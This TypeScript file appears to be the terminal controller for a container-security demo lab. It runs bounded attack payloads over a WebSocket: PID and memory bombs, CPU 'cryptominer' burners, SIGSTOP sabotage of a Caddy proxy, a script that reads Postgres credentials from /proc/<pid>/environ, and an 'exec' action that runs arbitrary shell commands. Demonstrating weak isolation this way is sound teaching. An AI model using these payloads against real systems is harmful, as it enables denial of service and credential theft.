import { spawn } from 'node:child_process';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import type { RawData, WebSocket, WebSocketServer } from 'ws';
import type { ActivePayload, CustomerSample } from '../lib/types/lab';
import { cgroupSummary, memorySummary, readFirst } from './evidence';
import { clamp, delay, runShell } from './shell';
import { line, send } from './socket';

type TerminalPayload = {
	type?: unknown;
	command?: unknown;
	count?: unknown;
	mb?: unknown;
	seconds?: unknown;
	workers?: unknown;
};

type TerminalControllerOptions = {
	dataDir: string;
	victimCheckoutUrl: string;
	directCustomerProbe: () => Promise<CustomerSample>;
};

const payloadActions = new Set(['pid-bomb', 'memory-bomb', 'cpu-burn', 'cpu-blast', 'sabotage-proxy']);
const payloadLabels: Record<string, string> = {
	'pid-bomb': 'PID bomb',
	'memory-bomb': 'Memory blast',
	'cpu-burn': 'CPU burn',
	'cpu-blast': 'Cryptominer',
	'sabotage-proxy': 'Reverse-proxy sabotage'
};

export class TerminalController {
	private memoryHold: Buffer[] = [];
	private terminalActionRunning = false;
	private activePayload: ActivePayload | null = null;
	private activePayloadTimer: ReturnType<typeof setTimeout> | null = null;
	private stopRequested = false;

	constructor(
		private readonly server: WebSocketServer,
		private readonly options: TerminalControllerOptions
	) {}

	attach(): void {
		this.server.on('connection', (socket) => {
			line(socket, 'system', 'connected to dokuru-lab terminal websocket\n');
			line(socket, 'system', 'commands run inside the vulnerable container runtime\n');
			this.sendActivePayload(socket);

			socket.on('message', (raw) => {
				void this.handleMessage(socket, raw);
			});
		});
	}

	private async handleMessage(socket: WebSocket, raw: RawData): Promise<void> {
		let message: TerminalPayload;
		try {
			const parsed = JSON.parse(String(raw));
			message = isRecord(parsed) ? parsed : {};
		} catch {
			line(socket, 'stderr', 'invalid terminal message: expected JSON\n');
			return;
		}

		const type = String(message.type || '');

		if (type === 'stop-payloads') {
			send(socket, 'terminal.start', { action: type });
			try {
				await this.runStopPayloads(socket);
				send(socket, 'terminal.exit', { action: type, code: 0 });
			} catch (error) {
				line(socket, 'stderr', `${error instanceof Error ? error.message : String(error)}\n`);
				send(socket, 'terminal.exit', { action: type, code: 1 });
			}
			return;
		}

		if (this.terminalActionRunning) {
			line(socket, 'stderr', 'terminal is busy running another action; wait or stop the active payload\n');
			send(socket, 'terminal.exit', { action: type, code: 1 });
			return;
		}

		if (payloadActions.has(type) && this.activePayload) {
			line(socket, 'stderr', `${this.activePayload.label} is still active; stop it before starting another payload\n`);
			this.sendActivePayload(socket);
			send(socket, 'terminal.exit', { action: type, code: 1 });
			return;
		}

		this.terminalActionRunning = true;
		this.stopRequested = false;
		send(socket, 'terminal.start', { action: type });

		if (payloadActions.has(type)) {
			this.activatePayload(type, payloadLabels[type] || type, payloadDurationMs(type, message));
		}

		try {
			await this.dispatchAction(socket, type, message);
			send(socket, 'terminal.exit', { action: type, code: 0 });
		} catch (error) {
			line(socket, 'stderr', `${error instanceof Error ? error.message : String(error)}\n`);
			send(socket, 'terminal.exit', { action: type, code: 1 });
		} finally {
			this.terminalActionRunning = false;
		}
	}

	private async dispatchAction(socket: WebSocket, type: string, message: TerminalPayload): Promise<void> {
		if (type === 'exec') {
			await runShell(socket, String(message.command || 'id').trim().slice(0, 1000) || 'id');
		} else if (type === 'probe') {
			await this.runProbe(socket);
		} else if (type === 'pid-bomb') {
			await this.runPidBomb(socket, message.count);
		} else if (type === 'memory-bomb') {
			await this.runMemoryBomb(socket, message.mb);
		} else if (type === 'cpu-burn') {
			await this.runCpuBurn(socket, message.seconds);
		} else if (type === 'cpu-blast') {
			await this.runCpuBlast(socket, message.seconds, message.workers);
		} else if (type === 'customer-probe') {
			await this.runCustomerProbe(socket);
		} else if (type === 'steal-secrets') {
			await this.runStealSecrets(socket);
		} else if (type === 'sabotage-proxy') {
			await this.runSabotageProxy(socket, message.seconds);
		} else if (type === 'cleanup') {
			await this.runCleanup(socket);
		} else {
			line(socket, 'stderr', `unknown action: ${type}\n`);
			throw new Error(`unknown action: ${type}`);
		}
	}

	private async runProbe(socket: WebSocket): Promise<void> {
		mkdirSync(this.options.dataDir, { recursive: true });
		const path = join(this.options.dataDir, 'recovery-probe.txt');
		const payload = `probe=${new Date().toISOString()}\n`;
		line(socket, 'system', `$ printf %q ${JSON.stringify(payload.trim())} > ${path}\n`);
		writeFileSync(path, payload);
		line(socket, 'stdout', `wrote ${path}\n`);
		line(socket, 'stdout', payload);
		line(socket, 'stdout', `uid_map=${readFirst(['/proc/self/uid_map']).replaceAll('\n', ' | ')}\n`);
	}

	private async runPidBomb(socket: WebSocket, rawCount: unknown): Promise<void> {
		const count = clamp(Number(rawCount || 120), 1, 500);
		line(socket, 'system', `$ dokuru-lab pid-bomb --count ${count}\n`);
		let spawned = 0;

		for (let index = 0; index < count; index += 1) {
			if (this.stopRequested) {
				line(socket, 'stderr', 'pid bomb stopped by user\n');
				break;
			}

			try {
				const child = spawn(
					process.execPath,
					['-e', "process.title='dokuru_pid_slp'; setTimeout(() => {}, 60000);"],
					{ detached: true, stdio: 'ignore' }
				);
				child.unref();
				spawned += 1;
				line(socket, 'stdout', `[${String(index + 1).padStart(3, '0')}] spawned sleeper pid=${child.pid}\n`);
				if ((index + 1) % 20 === 0) {
					line(socket, 'stdout', cgroupSummary());
				}
				await delay(8);
			} catch (error) {
				line(socket, 'stderr', `spawn failed at ${index + 1}: ${error instanceof Error ? error.message : String(error)}\n`);
				break;
			}
		}

		line(socket, 'stdout', `spawned ${spawned}/${count} requested sleeper processes\n`);
		line(socket, 'stdout', cgroupSummary());
	}

	private async runMemoryBomb(socket: WebSocket, rawMb: unknown): Promise<void> {
		const mb = clamp(Number(rawMb || 128), 1, 1536);
		line(socket, 'system', `$ dokuru-lab memory-bomb --mb ${mb}\n`);

		for (let index = 0; index < mb; index += 1) {
			if (this.stopRequested) {
				line(socket, 'stderr', 'memory blast stopped by user\n');
				break;
			}

			this.memoryHold.push(Buffer.alloc(1024 * 1024, 'a'));
			if ((index + 1) % 16 === 0 || index + 1 === mb) {
				line(socket, 'stdout', `allocated ${index + 1} MiB; held=${this.memoryHold.length} MiB; ${memorySummary()}\n`);
				await delay(20);
			}
		}
	}

	private async runCpuBurn(socket: WebSocket, rawSeconds: unknown): Promise<void> {
		const seconds = clamp(Number(rawSeconds || 5), 1, 30);
		line(socket, 'system', `$ dokuru-lab cpu-burn --seconds ${seconds}\n`);
		const script = `process.title='dokuru_cpu_burn'; const crypto = require('node:crypto'); const end = Date.now() + ${seconds} * 1000; let ops = 0; let last = Date.now(); console.log('cpu burn started for ${seconds}s'); while (Date.now() < end) { for (let i = 0; i < 5000; i++) crypto.createHash('sha256').update(String(ops++)).digest('hex'); if (Date.now() - last >= 500) { console.log('ops=' + ops); last = Date.now(); } } console.log('cpu burn done ops=' + ops);`;
		await new Promise<void>((resolve) => {
			const child = spawn(process.execPath, ['-e', script], { stdio: ['ignore', 'pipe', 'pipe'] });
			child.stdout.on('data', (chunk: Buffer) => line(socket, 'stdout', chunk.toString()));
			child.stderr.on('data', (chunk: Buffer) => line(socket, 'stderr', chunk.toString()));
			child.on('close', (code, signal) => {
				line(socket, 'system', `cpu burner exited code=${code ?? 'null'} signal=${signal ?? 'none'}\n`);
				resolve();
			});
		});
	}

	private async runCpuBlast(socket: WebSocket, rawSeconds: unknown, rawWorkers: unknown): Promise<void> {
		const seconds = clamp(Number(rawSeconds || 25), 1, 60);
		const workers = clamp(Number(rawWorkers || 4), 1, 8);
		line(socket, 'system', `$ dokuru-lab cryptominer --workers ${workers} --seconds ${seconds}\n`);

		const script = `process.title='dokuru_cpu_burn'; const crypto = require('node:crypto'); const end = Date.now() + ${seconds} * 1000; let ops = 0; while (Date.now() < end) { for (let i = 0; i < 5000; i++) crypto.createHash('sha256').update(String(ops++)).digest('hex'); }`;
		let spawned = 0;

		for (let index = 0; index < workers; index += 1) {
			try {
				const child = spawn(process.execPath, ['-e', script], { detached: true, stdio: 'ignore' });
				child.unref();
				spawned += 1;
				line(socket, 'stdout', `[miner ${index + 1}/${workers}] pid=${child.pid}\n`);
			} catch (error) {
				line(socket, 'stderr', `failed to spawn miner ${index + 1}: ${error instanceof Error ? error.message : String(error)}\n`);
			}
		}

		await delay(250);
		line(socket, 'stdout', `spawned ${spawned}/${workers} CPU miners for ${seconds}s; watch Customer Live View for latency spikes\n`);
		line(socket, 'stdout', cgroupSummary());
	}

	private async runCustomerProbe(socket: WebSocket): Promise<void> {
		line(socket, 'system', `$ curl -sS -m 2 ${this.options.victimCheckoutUrl}\n`);
		const sample = await this.options.directCustomerProbe();
		if (sample.ok) {
			line(socket, 'stdout', `customer OK status=${sample.status} latency=${sample.latency_ms}ms body=${sample.body}\n`);
		} else {
			line(socket, 'stderr', `customer FAIL status=${sample.status} latency=${sample.latency_ms}ms error=${sample.error}\n`);
		}
	}

	private async runStealSecrets(socket: WebSocket): Promise<void> {
		const command = [
			'set -eu',
			"echo '[1] visible postgres processes from inside attacker container'",
			"ps -eo pid,user,comm,args | grep -E '[p]ostgres|[v]ictim-secrets' | head -20 || true",
			"pid=$(pgrep -of 'postgres' || true)",
			"if [ -z \"$pid\" ]; then echo 'no postgres PID visible; PID namespace is isolated'; exit 2; fi",
			'echo "target_pid=$pid"',
			"echo '[2] reading /proc/$pid/environ'",
			"if [ ! -e \"/proc/$pid/environ\" ]; then echo 'environ file missing'; exit 3; fi",
			"tr '\\0' '\\n' < \"/proc/$pid/environ\" | grep -E 'POSTGRES|PASSWORD|USER|DB' || true"
		].join('\n');

		await runShell(socket, command, 8_000);
	}

	private async runSabotageProxy(socket: WebSocket, rawSeconds: unknown): Promise<void> {
		const seconds = clamp(Number(rawSeconds || 6), 3, 15);
		const command = [
			'set -u',
			`echo '[1] scheduling automatic caddy resume in ${seconds}s'`,
			`(sleep ${seconds}; pkill -CONT -x caddy 2>/dev/null || true; echo 'auto-resume attempted at '$(date -Is)) >/tmp/dokuru-caddy-resume.log 2>&1 &`,
			"echo '[2] stopping caddy from inside the attacker container'",
			'pkill -STOP -x caddy',
			'code=$?',
			"if [ \"$code\" -eq 0 ]; then echo 'caddy stopped; browser may disconnect until auto-resume runs'; else echo 'no caddy process visible; PID namespace is likely isolated'; fi",
			'exit 0'
		].join('\n');

		await runShell(socket, command, 4_000);
	}

	private async runCleanup(socket: WebSocket): Promise<void> {
		this.stopRequested = true;
		this.clearActivePayload();
		line(socket, 'system', 'dropping held memory buffers in the server process\n');
		this.memoryHold = [];
		await runShell(
			socket,
			"pkill -f '[d]okuru_pid_slp|[d]okuru_pid_bomb_sleep|[d]okuru_cpu_burn' 2>&1 || true",
			5_000
		);
		line(socket, 'stdout', `held memory cleared; ${cgroupSummary()}`);
	}

	private async runStopPayloads(socket: WebSocket): Promise<void> {
		this.stopRequested = true;
		this.clearActivePayload();
		line(socket, 'system', '$ dokuru-lab stop-payloads\n');
		line(socket, 'system', 'dropping held memory buffers in the server process\n');
		this.memoryHold = [];
		await runShell(
			socket,
			"pkill -f '[d]okuru_pid_slp|[d]okuru_pid_bomb_sleep|[d]okuru_cpu_burn' 2>&1 || true; pkill -CONT -x caddy 2>&1 || true",
			5_000
		);
		line(socket, 'stdout', `active payload stopped; held memory cleared; ${cgroupSummary()}`);
	}

	private activatePayload(type: string, label: string, durationMs: number | null): void {
		const startedAt = new Date();
		this.activePayload = {
			type,
			label,
			startedAt: startedAt.toISOString()
		};

		if (this.activePayloadTimer) {
			clearTimeout(this.activePayloadTimer);
			this.activePayloadTimer = null;
		}

		if (durationMs !== null && Number.isFinite(durationMs) && durationMs > 0) {
			this.activePayload.expiresAt = new Date(startedAt.getTime() + durationMs).toISOString();
			this.activePayloadTimer = setTimeout(() => this.clearActivePayload(type), durationMs + 500);
		}

		this.broadcastActivePayload();
	}

	private clearActivePayload(expectedType: string | null = null): void {
		if (expectedType && this.activePayload?.type !== expectedType) return;

		if (this.activePayloadTimer) {
			clearTimeout(this.activePayloadTimer);
			this.activePayloadTimer = null;
		}

		if (!this.activePayload) return;
		this.activePayload = null;
		this.broadcastActivePayload();
	}

	private sendActivePayload(socket: WebSocket): void {
		send(socket, 'terminal.payload', { payload: this.activePayload });
	}

	private broadcastActivePayload(): void {
		for (const socket of this.server.clients) {
			this.sendActivePayload(socket);
		}
	}
}

function payloadDurationMs(type: string, message: TerminalPayload): number | null {
	if (type === 'cpu-blast') return clamp(Number(message.seconds || 25), 1, 60) * 1000;
	if (type === 'cpu-burn') return clamp(Number(message.seconds || 5), 1, 30) * 1000;
	if (type === 'pid-bomb') return 60_000;
	if (type === 'sabotage-proxy') return clamp(Number(message.seconds || 6), 3, 15) * 1000;
	return null;
}

function isRecord(value: unknown): value is Record<string, unknown> {
	return typeof value === 'object' && value !== null;
}
